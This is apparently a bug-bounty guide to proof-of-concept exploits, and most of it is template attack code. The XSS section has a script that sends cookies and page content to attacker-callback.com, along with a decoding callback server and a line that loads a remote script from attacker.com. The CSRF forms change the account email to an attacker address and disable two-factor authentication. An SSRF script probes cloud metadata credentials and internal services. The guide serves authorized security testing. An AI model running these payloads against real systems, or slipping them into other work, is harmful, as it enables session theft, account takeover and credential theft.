# Proof-of-Concept Development Guide

## Introduction

A well-crafted Proof-of-Concept (PoC) is the difference between a triaged bug bounty report and one that gets closed as informative. PoCs demonstrate that a vulnerability is real, reproducible, and impactful. This guide covers building PoCs for the most common bug bounty vulnerability classes: HTML injection, cross-site scripting (XSS) with data exfiltration, cross-site request forgery (CSRF), and server-side request forgery (SSRF) chains.

Each section provides ready-to-adapt template code that you can customize for your specific target. Always test PoCs in authorized environments and ensure they comply with the bug bounty program rules.

## Practical Steps

### 1. HTML Injection PoC

HTML injection demonstrates that user-controlled input is rendered as HTML without proper encoding:

```html
<!-- Basic HTML injection test -->
<div style="background:red;padding:20px;">
  <h1>HTML Injection Successful</h1>
  <p>This content was injected via the vulnerable parameter.</p>
  <img src="https://attacker-domain.com/log?injection=html" />
</div>

<!-- URL-encoded payload for GET parameters -->
%3Cdiv%20style%3D%22background%3Ared%22%3E%3Ch1%3EInjected%3C%2Fh1%3E%3C%2Fdiv%3E
```

**Testing workflow:**

```bash
# Identify injectable parameters
curl -s "https://target.com/search?q=<h1>test</h1>" | grep "<h1>test</h1>"

# Confirm the injection renders as HTML
curl -s "https://target.com/search?q=<img src=x onerror=alert(1)>"
```

### 2. XSS PoC with Data Exfiltration

Demonstrate XSS impact by showing data exfiltration capability:

```html
<!-- XSS PoC that exfiltrates cookies and page content -->
<script>
(function() {
  var data = {
    url: document.location.href,
    cookies: document.cookie,
    title: document.title,
    body: document.body.innerHTML.substring(0, 5000)
  };
  var img = new Image();
  img.src = 'https://attacker-callback.com/collect?d=' +
    btoa(JSON.stringify(data));
})();
</script>
```

**Blind XSS detection with callback:**

```bash
# Set up a callback server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, base64
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'd=' in self.path:
            d = self.path.split('d=')[1]
            print(json.loads(base64.b64decode(d)))
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
```

**DOM XSS PoC template:**

```javascript
// Test for DOM-based XSS via location.hash
javascript:eval('var s=document.createElement("script");s.src="https://attacker.com/xss.js";document.body.appendChild(s)')

// Prototype pollution to XSS chain
Object.prototype.innerHTML = '<img src=x onerror=alert(document.domain)>'
```

### 3. CSRF PoC Generator

Build CSRF PoCs that demonstrate state-changing actions:

```html
<!-- CSRF PoC for POST-based actions (auto-submit form) -->
<html>
<body>
  <h1>CSRF PoC - Click to trigger</h1>
  <form id="csrf_form" action="https://target.com/api/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="confirm" value="true" />
  </form>
  <script>document.getElementById('csrf_form').submit();</script>
</body>
</html>

<!-- CSRF via XMLHttpRequest for JSON endpoints -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/settings', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
  "notification_email": "attacker@evil.com",
  "two_factor_enabled": false
}));
</script>
```

### 4. SSRF Chain PoC

Demonstrate SSRF impact by chaining to internal services:

```bash
# Basic SSRF test
curl -s "https://target.com/fetch?url=http://127.0.0.1:80"

# SSRF to internal metadata service
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# SSRF chain PoC template (save as poc.py)
```

```python
#!/usr/bin/env python3
"""SSRF Chain PoC - Demonstrates internal service access"""
import requests
import sys

TARGET = "https://target.com/proxy"
INTERNAL_HOSTS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://169.254.169.254/latest/meta-data/",
    "http://internal-api:8080/admin",
    "http://localhost:6379/",  # Redis
]

for host in INTERNAL_HOSTS:
    try:
        r = requests.get(TARGET, params={"url": host}, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] {host} -> {r.status_code} ({len(r.text)} bytes)")
            print(f"    Preview: {r.text[:200]}")
    except Exception as e:
        print(f"[-] {host} -> Error: {e}")
```

### 5. Hosting PoCs

```bash
# Serve PoC HTML files locally
python3 -m http.server 8080

# Use a public callback service for blind testing
# Interactsh (ProjectDiscovery)
interactsh-client

# Or use Burp Collaborator
# Configure in Burp Suite -> Project options -> Misc -> Collaborator
```

## References

- OWASP XSS Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- SSRF Bible: https://github.com/jdonsec/AllTheThings/
- Interactsh: https://github.com/projectdiscovery/interactsh
